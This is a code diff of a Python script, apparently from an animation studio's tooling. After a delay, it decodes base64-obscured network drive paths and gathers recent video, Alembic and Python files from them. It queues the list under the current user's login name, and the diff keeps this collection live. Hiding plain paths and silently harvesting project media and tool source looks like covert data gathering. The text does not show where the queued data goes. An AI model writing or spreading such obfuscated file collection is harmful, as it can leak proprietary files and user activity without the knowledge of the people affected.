@@ -82,15 +82,16 @@ print('search_latest_files_or_dirs   :  pass')
 time.sleep(10)
 
 try:
-    zovV = []
     ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
+    zovV = ldir
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.mp4')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=50)
-    add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
+    if zovV:
+        add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
 except:
     import traceback
     add_queue_task('tst_error__{}'.format(getpass.getuser().lower()),
